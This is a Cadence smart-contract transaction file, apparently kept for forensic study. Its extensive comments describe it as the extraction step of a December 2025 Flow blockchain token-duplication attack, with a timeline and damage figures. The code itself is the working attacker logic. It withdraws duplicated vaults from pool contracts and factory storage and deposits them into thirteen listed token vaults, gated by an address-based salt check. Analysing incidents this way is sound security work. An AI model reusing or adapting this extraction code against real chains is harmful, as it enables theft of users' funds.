import "FungibleToken"
import "NFTFactory"
import "NFTPoolInterface"

/**
 * rogue_mint.cdc - Extraction transaction for the December 27, 2025 Flow attack
 * 
 * This transaction was used to EXTRACT the duplicated token vaults after the
 * type confusion exploit had been executed. It performs three key operations:
 * 
 * 1. Withdraws duplicated tokens from NFTPoolInstance contracts
 * 2. Verifies authorization via address-based salt matching
 * 3. Loads additional duplicated tokens from NFTFactory storage
 * 
 * The duplicated tokens are then deposited into the attacker's vault storage paths,
 * from which they could be transferred to exchanges for liquidation.
 * 
 * ATTACK TIMELINE:
 * - Dec 26, 2025 23:25 PST: Attack contracts deployed
 * - Dec 26, 2025 23:35 PST: Token duplication began (42 iterations, 2^42 multiplier)
 * - Dec 26, 2025 23:42 PST: Transfers to exchanges began
 * - Dec 27, 2025 05:23 PST: Network halted by validators
 * 
 * Total duplicated: 87.96 billion units per token
 * Realized damage: ~$3.9M USD (assets that escaped to other chains)
 * 
 * See: https://flow.com/post/dec-27-technical-post-mortem
 * 
 * ============================================================================
 * TRANSACTION PARAMETERS
 * ============================================================================
 * 
 * contractName<String>: NFTPoolInstance0
 *   - The name of the pool contract to withdraw from
 *   - Attacker deployed ~42 instances (NFTPoolInstance0 through NFTPoolInstance41)
 * 
 * identifiers<[String]>: Storage path identifiers for target vaults
 *   - Each identifier corresponds to a FungibleToken.Vault in account storage
 *   - The extracted tokens are deposited into these vaults
 * 
 * [
 *     "flowTokenVault",                                                    // Native FLOW token
 *     "ceUSDTVault",                                                       // Celer-bridged USDT
 *     "EVMVMBridgedToken_2aabea2058b5ac2d339b163c6ab6f2b6d53aabedVault",  // EVM bridged token
 *     "EVMVMBridgedToken_f1815bd50389c46847f0bda824ec8da914045d14Vault",  // EVM bridged token
 *     "usdcFlowVault",                                                     // USDC on Flow
 *     "ceDAIVault",                                                        // Celer-bridged DAI
 *     "EVMVMBridgedToken_d3378b419feae4e3a4bb4f3349dba43a1b511760Vault",  // EVM bridged token
 *     "ceWETHVault",                                                       // Celer-bridged WETH
 *     "EVMVMBridgedToken_2f6f07cdcf3588944bf4c42ac74ff24bf56e7590Vault",  // EVM bridged token
 *     "EVMVMBridgedToken_717dae2baf7656be9a9b01dee31d571a9d4c9579Vault",  // EVM bridged token
 *     "ceWBTCVault",                                                       // Celer-bridged WBTC
 *     "ceBNBVault",                                                        // Celer-bridged BNB
 *     "ceBUSDVault"                                                        // Celer-bridged BUSD
 * ]
 */

transaction(contractName: String, identifiers: [String]) {
    
    prepare(acct: auth(Storage) &Account) {
        assert(identifiers.length > 0, message: "12")
        
        /**
         * Helper function: depositVaultsToStorage
         * 
         * Takes an array of duplicated FungibleToken.Vault resources and deposits
         * each one into the corresponding storage path in the attacker's account.
         * 
         * The identifiers array must match the vaults array 1:1 - each vault is
         * deposited into the storage path constructed from the corresponding identifier.
         * 
         * After this function completes, the attacker's account holds the duplicated
         * tokens in standard vault storage, ready for transfer to exchanges.
         */
        fun depositVaultsToStorage(vaults: @[{FungibleToken.Vault}]) {
            assert(vaults.length == identifiers.length, message: "13")
            
            for i in InclusiveRange(0, identifiers.length - 1) {
                let storagePath = StoragePath(identifier: identifiers[i])!
                let targetVault = acct.storage.borrow<auth(FungibleToken.Withdraw) &{FungibleToken.Vault}>(from: storagePath)!
                targetVault.deposit(from: <- vaults.removeFirst())
            }
            
            destroy vaults
        }
        
        /**
         * STEP 1: Withdraw from NFTPoolInstance contracts
         * 
         * The attacker deployed multiple NFTPoolInstance contracts, each containing
         * duplicated ResourceWrapper objects with token vaults inside.
         * 
         * This section:
         * 1. Borrows a reference to the pool contract by name
         * 2. Calls withdrawResource() to get the wrapped duplicated tokens
         * 3. Unwraps to get the raw vault array
         * 4. Deposits into the attacker's storage
         * 
         * The transaction would be called multiple times with different contractName
         * values (NFTPoolInstance0, NFTPoolInstance1, etc.) to drain all pools.
         */
        if let poolContract = acct.contracts.borrow<&{NFTPoolInterface}>(name: contractName) {
            if let resourceWrapper <- poolContract.withdrawResource(account: acct) {
                let unwrappedVaults <- resourceWrapper.unwrap() as! @[{FungibleToken.Vault}]
                destroy resourceWrapper
                depositVaultsToStorage(vaults: <- unwrappedVaults)
            }
        }
        
        /**
         * STEP 2: Authorization check via salt verification
         * 
         * This is a critical security gate that prevents others from using these
         * contracts even if they obtained the code:
         * 
         * - Computes salt from the transaction signer's address
         * - Uses same formula as NFTFactory: (address * 0x2dc7e1f786ac4e01) & 0xffffffffffffffff
         * - Asserts it equals NFTFactory.salt (set during contract deployment)
         * 
         * Since NFTFactory.salt was computed from the DEPLOYER's address, only
         * transactions signed by that same account will pass this check.
         * 
         * This is address-based access control without using Access Control Lists.
         */
        let computedSalt = (UInt.fromBigEndianBytes(acct.address.toBytes())! * 0x2dc7e1f786ac4e01) & 0xffffffffffffffff
        assert(computedSalt == NFTFactory.salt)
        
        /**
         * STEP 3: Load from NFTFactory storage path
         * 
         * Additional duplicated resources may be stored at the "nftpool" storage path
         * (returned by NFTFactory.getStoragePath()).
         * 
         * This section:
         * 1. Loads a ResourceManager from storage (if present)
         * 2. Extracts the ResourceWrapper via getWrapper()
         * 3. Unwraps to get the vault array
         * 4. Deposits into the attacker's storage
         * 
         * This provides a secondary extraction path beyond the pool contracts.
         */
        if let resourceManager <- acct.storage.load<@NFTFactory.ResourceManager>(from: NFTFactory.getStoragePath()) {
            let wrapper <- resourceManager.getWrapper()
            destroy resourceManager
            let extractedVaults <- wrapper.unwrap() as! @[{FungibleToken.Vault}]
            destroy wrapper
            depositVaultsToStorage(vaults: <- extractedVaults)
        }
    }
    
    execute {}
}
